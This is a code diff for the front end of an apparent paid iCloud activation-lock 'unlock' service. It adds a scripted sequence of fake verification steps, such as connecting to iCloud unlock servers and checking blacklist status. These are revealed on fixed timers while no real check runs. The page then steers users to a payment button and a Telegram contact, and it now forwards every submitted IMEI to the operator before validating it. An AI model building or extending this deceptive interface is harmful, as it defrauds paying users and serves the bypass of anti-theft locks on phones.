@@ -1,3 +1,4 @@
+
 'use client';
 
 import { useState, useEffect, Suspense, useMemo } from 'react';
@@ -21,7 +22,7 @@ import { addDoc, collection, doc, serverTimestamp, runTransaction, query, where,
 import { errorEmitter } from '@/firebase/error-emitter';
 import { FirestorePermissionError } from '@/firebase/errors';
 import { useToast } from '@/hooks/use-toast';
-import { Copy, Menu } from 'lucide-react';
+import { Copy, Menu, Loader, CheckCircle2 } from 'lucide-react';
 import { Sheet, SheetContent, SheetHeader, SheetTitle, SheetTrigger } from '@/components/ui/sheet';
 import { ScrollArea } from '@/components/ui/scroll-area';
 import { Separator } from '@/components/ui/separator';
@@ -36,7 +37,7 @@ interface Submission {
   price: number;
   image: string;
   imei: string;
-  status: 'waiting' | 'eligible' | 'not_supported' | 'paid' | 'feedback' | 'find_my_off';
+  status: 'waiting' | 'eligible' | 'not_supported' | 'paid' | 'feedback' | 'find_my_off' | 'device_found';
   feedback: string[] | null;
   createdAt: any;
 }
@@ -65,6 +66,49 @@ const paymentMethods = [
     { name: 'Cash App', imageUrl: 'https://i.postimg.cc/Df6jpBcX/download.png' },
 ];
 
+const verificationStepsList = [
+    "Validating request and input format",
+    "Normalizing device identifier (IMEI / Serial / TAC)",
+    "Completing Cloudflare security verification",
+    "Connecting to iCloud unlock servers",
+    "Querying manufacturer and model reference database",
+    "Checking device model details",
+    "Checking iCloud (Find My) activation status",
+    "Checking blacklist / carrier status",
+    "Searching multiple secure data sources",
+    "Correlating results and resolving matches",
+    "Applying server-side validation rules",
+    "Verifying unlock server support eligibility",
+    "Finalizing compatibility check"
+];
+
+function VerificationSteps({ steps }: { steps: string[] }) {
+    const [revealedStep, setRevealedStep] = useState(0);
+
+    useEffect(() => {
+        if (revealedStep < steps.length) {
+            const timer = setTimeout(() => {
+                setRevealedStep(prev => prev + 1);
+            }, 1500); // 1.5 second delay between steps
+            return () => clearTimeout(timer);
+        }
+    }, [revealedStep, steps.length]);
+
+    return (
+        <div className="w-full text-left p-4 md:p-6 space-y-3">
+            {steps.slice(0, revealedStep).map((step, index) => (
+                <div key={index} className="flex items-center gap-3 text-sm animate-fade-in">
+                    {index < revealedStep - 1 ? (
+                        <CheckCircle2 className="h-5 w-5 text-green-500 flex-shrink-0" />
+                    ) : (
+                        <Loader className="h-5 w-5 animate-spin text-blue-500 flex-shrink-0" />
+                    )}
+                    <span className="text-gray-700">{step}</span>
+                </div>
+            ))}
+        </div>
+    );
+}
 
 const CopyToClipboard = ({ text, children }: { text: string; children: React.ReactNode }) => {
   const { toast } = useToast();
@@ -110,6 +154,24 @@ function DeviceCheckContent() {
   const [timeLeft, setTimeLeft] = useState(20 * 60);
   const [animationSpeed, setAnimationSpeed] = useState<'slow' | 'fast'>('slow');
   
+  const [showDeviceFoundNotif, setShowDeviceFoundNotif] = useState(false);
+  const [startVerificationSteps, setStartVerificationSteps] = useState(false);
+  
+  useEffect(() => {
+    if (submission?.status === 'device_found') {
+        setShowDeviceFoundNotif(true);
+        const timer = setTimeout(() => {
+            setShowDeviceFoundNotif(false);
+            setStartVerificationSteps(true);
+        }, 5000);
+        return () => clearTimeout(timer);
+    } else if (submission?.status && submission.status !== 'waiting') {
+        setShowDeviceFoundNotif(false);
+        setStartVerificationSteps(false);
+    }
+  }, [submission?.status, submission?.id]);
+
+
   const feedbackData = useMemo(() => {
     if (!submission?.feedback) return { lines: [], timestamp: null };
     const lines = submission.feedback.filter(line => !line.startsWith('TIMESTAMP:'));
@@ -118,7 +180,7 @@ function DeviceCheckContent() {
     return { lines, timestamp };
   }, [submission?.feedback]);
 
-  const shouldShowLoader = isChecking || (submission?.status === 'waiting' && !submission.feedback);
+  const shouldShowMainLoader = isChecking || !submission || submission.status === 'waiting';
 
 
   useEffect(() => {
@@ -143,6 +205,8 @@ function DeviceCheckContent() {
     setImei('');
     setSubmissionId(null);
     setValidationError(null);
+    setShowDeviceFoundNotif(false);
+    setStartVerificationSteps(false);
   };
 
   useEffect(() => {
@@ -173,12 +237,12 @@ function DeviceCheckContent() {
     }
 
     setValidationError(null);
+    setShowDeviceFoundNotif(false);
+    setStartVerificationSteps(false);
     setAnimationSpeed('slow');
     
 
     const trimmedImei = imei.trim();
-    const isImeiValid = /^\d{15}$/.test(trimmedImei);
-    const isSerialValid = /^[a-zA-Z0-9]{10,13}$/.test(trimmedImei);
     
     const message = `🚨 <b>New Device Check Submitted!</b> 🚀\n\n<b>Model:</b> ${model}\n<b>IMEI/Serial:</b> ${trimmedImei}\n<b>User ID:</b> ${user.uid}`;
     try {
@@ -192,6 +256,9 @@ function DeviceCheckContent() {
     } catch (error) {
       console.error("Failed to send Telegram notification:", error);
     }
+    
+    const isImeiValid = /^\d{15}$/.test(trimmedImei);
+    const isSerialValid = /^[a-zA-Z0-9]{10,13}$/.test(trimmedImei);
 
     if (!isImeiValid && !isSerialValid) {
         setTimeout(() => {
@@ -210,7 +277,7 @@ function DeviceCheckContent() {
       const q = query(
         submissionsRef,
         where('imei', '==', trimmedImei),
-        where('status', 'in', ['eligible', 'find_my_off', 'not_supported', 'paid', 'feedback']),
+        where('status', 'in', ['eligible', 'find_my_off', 'not_supported', 'paid', 'feedback', 'device_found']),
         limit(1)
       );
       const querySnapshot = await getDocs(q);
@@ -223,7 +290,7 @@ function DeviceCheckContent() {
         if (existingData.status === 'feedback') {
             // This will allow the code to proceed to create a new document below.
         } else {
-             if ((existingData.status === 'eligible' || existingData.status === 'find_my_off') && existingData.model !== model) {
+             if ((existingData.status === 'eligible' || existingData.status === 'find_my_off' || existingData.status === 'device_found') && existingData.model !== model) {
                 setIsChecking(false);
                 setValidationError('This IMEI/Serial is already associated with a different device model. Please select the correct model to proceed.');
                 return;
@@ -363,6 +430,106 @@ function DeviceCheckContent() {
     );
   }
   
+  const renderContent = () => {
+    if (validationError) {
+      return (
+          <div className="w-full text-left p-4">
+              <div className="p-2 px-3 rounded-md bg-red-100 border border-red-200 text-sm whitespace-pre-wrap font-mono text-red-800">
+                {validationError}
+              </div>
+          </div>
+      );
+    }
+    if (!submissionId) {
+        return (
+            <div className="flex flex-col items-center justify-center h-full">
+              <p className="font-semibold text-gray-700">No IMEI submitted yet.</p>
+              <p className="text-sm text-gray-500">Submit your IMEI or serial number to check if unlock is supported.</p>
+            </div>
+        );
+    }
+    if (!submission && submissionId && !submissionLoading) {
+        return (
+            <div className="flex flex-col items-center justify-center h-full">
+              <p className="font-semibold text-destructive">This submission was not found.</p>
+              <p className="text-sm text-gray-500">It may have been deleted by an administrator. Please clear and try again.</p>
+            </div>
+        );
+    }
+
+    if (submissionLoading || shouldShowMainLoader) {
+      return <VerificationAnimation />;
+    }
+
+    if (submission?.status === 'device_found') {
+        if (showDeviceFoundNotif) {
+            return (
+                <div className="flex items-center justify-center h-full">
+                    <p className="text-2xl font-bold animate-fade-in">Device Found</p>
+                </div>
+            );
+        }
+        return <VerificationSteps steps={verificationStepsList} />;
+    }
+
+    if (submission && ['eligible', 'not_supported', 'feedback', 'find_my_off'].includes(submission.status)) {
+        return (
+            <div className="w-full text-left p-4">
+              <div className="space-y-2">
+                {feedbackData.lines.map((line, index) => {
+                  if (line === 'FIND_MY_ON_STATUS') {
+                    return (
+                      <div key={index} className="p-2 px-3 rounded-md bg-white border border-gray-200 text-sm font-mono flex items-center gap-2">
+                        <span>Find My:</span>
+                        <span className="bg-red-500 text-white font-bold px-2 py-0.5 rounded-md text-xs">ON</span>
+                      </div>
+                    )
+                  }
+                  if (line === 'FIND_MY_OFF_STATUS') {
+                    return (
+                      <div key={index} className="p-2 px-3 rounded-md bg-white border border-gray-200 text-sm font-mono flex items-center gap-2">
+                        <span>Find My:</span>
+                        <span className="bg-green-500 text-white font-bold px-2 py-0.5 rounded-md text-xs">OFF</span>
+                      </div>
+                    )
+                  }
+                  return (
+                    <div key={index} className="p-2 px-3 rounded-md bg-white border border-gray-200 text-sm whitespace-pre-wrap font-mono">
+                      {line}
+                    </div>
+                  )
+                })}
+              </div>
+              {feedbackData.timestamp && (
+                <p className="text-xs text-gray-500 mt-2 text-right">Feedback received: {feedbackData.timestamp}</p>
+              )}
+              {submission.status === 'eligible' && (
+                <div className="mt-4 text-right flex items-center justify-end gap-4 animate-fade-in">
+                  <p className="bg-green-100 text-green-800 font-semibold p-2 px-3 rounded-lg">✅ This device is eligible for iCloud Unlock</p>
+                  <Button onClick={openPaymentModal} className="btn-primary text-white">Proceed with Unlock</Button>
+                </div>
+              )}
+               {submission.status === 'not_supported' && (
+                 <p className="bg-red-100 text-red-800 font-semibold p-2 px-3 rounded-lg mt-4 text-center">❌ Unable to proceed with the unlock.</p>
+               )}
+               {submission.status === 'find_my_off' && (
+                 <p className="bg-blue-100 text-blue-800 font-semibold p-2 px-3 rounded-lg mt-4 text-center">
+                    Find My is OFF. If you need help restoring your device, please contact the {' '}
+                    <a href="https://t.me/Chris_Morgan057" target="_blank" rel="noopener noreferrer" className="underline font-bold">
+                        technician
+                    </a>.
+                 </p>
+               )}
+               {submission.status === 'feedback' && (
+                 <p className="bg-blue-100 text-blue-800 font-semibold p-2 px-3 rounded-lg mt-4 text-center">ℹ️ Select the correct device model, and check again.</p>
+               )}
+            </div>
+        );
+    }
+    
+    return null;
+  }
+
   return (
     <div className="bg-gray-50 text-gray-800 flex flex-col min-h-screen">
       <nav className="glass-effect fixed w-full top-0 z-50">
@@ -431,10 +598,10 @@ function DeviceCheckContent() {
                 value={submission ? submission.imei : imei}
                 onChange={(e) => setImei(e.target.value)}
                 className="w-full sm:w-80"
-                disabled={shouldShowLoader}
+                disabled={shouldShowMainLoader}
               />
               <div className="flex gap-3">
-                <Button onClick={handleSubmitImei} className="btn-primary text-white" disabled={shouldShowLoader}>Submit</Button>
+                <Button onClick={handleSubmitImei} className="btn-primary text-white" disabled={shouldShowMainLoader}>Submit</Button>
                 <Button onClick={handleClear} variant="outline">Clear</Button>
               </div>
             </div>
@@ -445,82 +612,9 @@ function DeviceCheckContent() {
         </div>
 
         <div className={cn("mt-5 rounded-lg border border-gray-200", 
-            shouldShowLoader ? "bg-white overflow-hidden" : "p-4 bg-gray-50 min-h-[120px] flex items-center justify-center flex-col text-center"
+            shouldShowMainLoader ? "bg-white overflow-hidden" : "p-4 bg-gray-50 min-h-[120px] flex items-center justify-center flex-col text-center"
         )}>
-          {shouldShowLoader && !validationError && (
-              <VerificationAnimation />
-          )}
-          {!shouldShowLoader && validationError && (
-              <div className="w-full text-left">
-                  <div className="p-2 px-3 rounded-md bg-red-100 border border-red-200 text-sm whitespace-pre-wrap font-mono text-red-800">
-                    {validationError}
-                  </div>
-              </div>
-          )}
-          {!shouldShowLoader && !validationError && !submissionId && (
-            <div>
-              <p className="font-semibold text-gray-700">No IMEI submitted yet.</p>
-              <p className="text-sm text-gray-500">Submit your IMEI or serial number to check if unlock is supported.</p>
-            </div>
-          )}
-          {!shouldShowLoader && !validationError && submission && (submission.status === 'eligible' || submission.status === 'not_supported' || submission.status === 'feedback' || submission.status === 'find_my_off') && (
-            <div className="w-full text-left">
-              <div className="space-y-2">
-                {feedbackData.lines.map((line, index) => {
-                  if (line === 'FIND_MY_ON_STATUS') {
-                    return (
-                      <div key={index} className="p-2 px-3 rounded-md bg-white border border-gray-200 text-sm font-mono flex items-center gap-2">
-                        <span>Find My:</span>
-                        <span className="bg-red-500 text-white font-bold px-2 py-0.5 rounded-md text-xs">ON</span>
-                      </div>
-                    )
-                  }
-                  if (line === 'FIND_MY_OFF_STATUS') {
-                    return (
-                      <div key={index} className="p-2 px-3 rounded-md bg-white border border-gray-200 text-sm font-mono flex items-center gap-2">
-                        <span>Find My:</span>
-                        <span className="bg-green-500 text-white font-bold px-2 py-0.5 rounded-md text-xs">OFF</span>
-                      </div>
-                    )
-                  }
-                  return (
-                    <div key={index} className="p-2 px-3 rounded-md bg-white border border-gray-200 text-sm whitespace-pre-wrap font-mono">
-                      {line}
-                    </div>
-                  )
-                })}
-              </div>
-              {feedbackData.timestamp && (
-                <p className="text-xs text-gray-500 mt-2 text-right">Feedback received: {feedbackData.timestamp}</p>
-              )}
-              {submission.status === 'eligible' && (
-                <div className="mt-4 text-right flex items-center justify-end gap-4 animate-fade-in">
-                  <p className="bg-green-100 text-green-800 font-semibold p-2 px-3 rounded-lg">✅ This device is eligible for iCloud Unlock</p>
-                  <Button onClick={openPaymentModal} className="btn-primary text-white">Proceed with Unlock</Button>
-                </div>
-              )}
-               {submission.status === 'not_supported' && (
-                 <p className="bg-red-100 text-red-800 font-semibold p-2 px-3 rounded-lg mt-4 text-center">❌ Unable to proceed with the unlock.</p>
-               )}
-               {submission.status === 'find_my_off' && (
-                 <p className="bg-blue-100 text-blue-800 font-semibold p-2 px-3 rounded-lg mt-4 text-center">
-                    Find My is OFF. If you need help restoring your device, please contact the {' '}
-                    <a href="https://t.me/Chris_Morgan057" target="_blank" rel="noopener noreferrer" className="underline font-bold">
-                        technician
-                    </a>.
-                 </p>
-               )}
-               {submission.status === 'feedback' && (
-                 <p className="bg-blue-100 text-blue-800 font-semibold p-2 px-3 rounded-lg mt-4 text-center">ℹ️ Select the correct device model, and check again.</p>
-               )}
-            </div>
-          )}
-           {!shouldShowLoader && !validationError && !submission && submissionId && (
-            <div>
-              <p className="font-semibold text-destructive">This submission was not found.</p>
-              <p className="text-sm text-gray-500">It may have been deleted by an administrator. Please clear and try again.</p>
-            </div>
-           )}
+          {renderContent()}
         </div>
       </main>
 
